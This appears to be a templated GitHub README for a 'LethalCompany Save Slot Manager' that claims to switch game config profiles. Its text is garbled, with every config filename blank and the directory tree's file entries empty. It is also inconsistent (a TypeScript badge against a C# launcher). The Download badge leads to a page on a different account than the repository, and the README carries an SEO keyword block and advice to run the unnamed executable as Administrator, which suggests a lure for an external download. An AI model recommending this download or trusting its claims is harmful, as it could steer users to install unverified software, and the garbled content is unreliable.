# LethalCompany Save Slot Manager

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-0d9488?style=plastic&logo=typescript&logoColor=white" alt="Download">
  </a>
  <a href="https://github.com/gigahokagepincers/LethalCompany-Save-Slot-Manager/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-2d7dd2?style=flat-square&logo=github&logoColor=white" alt="License">
  </a>
  <a href="https://github.com/gigahokagepincers/LethalCompany-Save-Slot-Manager/releases">
    <img src="https://img.shields.io/badge/Version-1.2.0-ffa500?style=plastic&logo=github&logoColor=white" alt="Version">
  </a>
  <a href="https://github.com/gigahokagepincers/LethalCompany-Save-Slot-Manager/issues">
    <img src="https://img.shields.io/badge/Status-Stable-00c853?style=flat&logo=check&logoColor=white" alt="Status">
  </a>
  <a href="#">
    <img src="https://img.shields.io/badge/Platform-Windows-0078d7?style=for-the-badge&logo=windows&logoColor=white" alt="Platform">
  </a>
</div>

---

## Overview

The **LethalCompany Save Slot Manager** streamlines the handling of save files for LethalCompany. It introduces a profile‑centric approach where each profile bundles a collection of configuration files (``, ``, ``, ``). Users can switch between distinct gameplay setups—such as “Stealth Run”, “Hardcore Nightmare”, or “Co‑op Sprint”—with a single click, without manually moving or overwriting files. The manager also ships with a pre‑packaged release bundle that contains the latest stable binaries, a sample configuration set, and a portable launcher.

Key motivations behind the project are:

* Eliminate the tedious copy‑paste cycle after each session.
* Preserve experimentations safely; each profile lives in its own folder.
* Provide a reproducible workflow for streamers, testers, and casual players alike.

---

## Core Features

- **Profile Isolation** – Every profile is a self‑contained directory under `Profiles/`. Switching updates the game’s save folder atomically.
- **Workflow Presets** – Pre‑defined profiles (`Stealth`, `Hardcore`, `Co‑op`) are shipped in the release bundle. Users can clone and rename them for personal tweaks.
- **Config‑Driven Mapping** – A single `profile.json` describes which configuration files belong to the active slot. The format is human‑readable and can be edited with any text editor.
- **Portable Launcher** – The `Release` launcher runs without installation; it detects the game’s root automatically and presents a dropdown of available slots.
- **Rollback Capability** – Before a profile swap, the manager copies the current save state to a hidden `Backup/` folder, allowing an instant revert.
- **Cross‑Session Persistence** – The selected slot is stored in `active_slot.txt`; the game resumes with the same profile after a restart.

Below is a concise table that maps configuration filenames to their typical purpose within a profile:

| File          | Description                                      | Typical Adjustments |
|---------------|--------------------------------------------------|---------------------|
| ``| Core gameplay settings (difficulty, AI count)   | Difficulty level, spawn rates |
| `` | Graphics and UI options                          | Resolution, HUD opacity |
| `` | Player‑specific preferences (controls, keybinds) | Mouse sensitivity, key remaps |
| `` | Optional user‑defined overrides                  | utility‑compatible flags (non‑utility usage) |

---

## Directory Layout

The repository follows a clear, flat structure that mirrors the runtime layout. The tree below is shown with a four‑space indentation to keep it as a pre‑formatted block without fenced code markers.

    LethalCompany-Save-Slot-Manager/
    ├─ Profiles/
    │   ├─ Stealth/
    │   │   ├─
    │   │   ├─
    │   │   ├─
    │   │   └─
    │   ├─ Hardcore/
    │   │   ├─
    │   │   ├─
    │   │   ├─
    │   │   └─
    │   └─ Co‑op/
    │       ├─
    │       ├─
    │       ├─
    │       └─
    ├─ Backup/
    │   └─ (timestamped copies of previous slots)
    ├─ Launcher/
    │   ├─ Release
    │   └─ profile.json
    ├─ README.md
    └─ CHANGELOG.md

The **Launcher** folder contains the executable and the JSON mapping that drives slot selection. The **Backup** folder is created automatically; users can purge old entries manually if storage becomes a concern.

---

## Installation & Quick Start

1. **Download the release bundle** via the badge at the top of this page. The archive includes the `Launcher/` directory and a set of sample profiles.
2. Extract the archive into a location of your choosing. No installer is required; the manager runs directly from the extracted folder.
3. Place the extracted `Launcher/` folder next to your LethalCompany installation, or edit `profile.json` to point to the correct game root (`"gamePath": "C:\\Games\\LethalCompany"`).
4. Launch `Release`. The UI presents a dropdown with all folders found under `Profiles/`. Select the desired slot and press **Apply**.
5. The manager copies the selected configuration files into the game's save directory, creates a backup of the previous state, and updates `active_slot.txt`.

> **Tip:** To create a new profile, duplicate an existing folder inside `Profiles/`, rename it, and adjust the `.cfg` files as needed. The manager will automatically list the new slot on the next launch.

---

## FAQ & Troubleshooting

| Question | Answer |
|----------|--------|
| **The launcher closes instantly.** | Verify that the `gamePath` entry in `profile.json` points to the exact root of your LethalCompany installation. Missing or mistyped paths cause an early exit. |
| **My  changes are ignored.** | Ensure the file is saved with UTF‑8 encoding and that the JSON mapping includes `"": true`. The manager only copies files flagged as active. |
| **Backup folder grows too large.** | Backups are timestamped. Delete any entries older than the last few sessions; the manager will continue to function without them. |
| **The dropdown shows no profiles.** | Confirm that each profile directory contains at least one of the recognized `.cfg` files. Empty folders are ignored by design. |
| **I receive “Access denied” errors on Windows.** | Run `Release` as Administrator, or relocate the manager to a folder where your user account has write permissions (e.g., `%USERPROFILE%\Documents\LCSM`). |

If you encounter an issue not covered here, open a discussion in the repository’s **Issues** tab and include the following details:

* Operating system version
* LethalCompany version
* Exact steps leading to the problem
* Contents of `profile.json` (redacted paths are fine)

---

### Contribution Guidelines

Contributions are welcome. Fork the repository, create a feature branch named `feat/<description>`, and submit a pull request that adheres to the existing coding style (C# for the launcher, JSON for configuration). Please keep the README updated with any new features or breaking changes.

---

#### SEO Tags

`lethalcompany`, `save`, `slot`, `manager`, `lethalcompany-save`, `save-slot`, `slot-manager`, `lethalcompany-manager`, `lethalcompany-helper`, `lethalcompany-config`

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```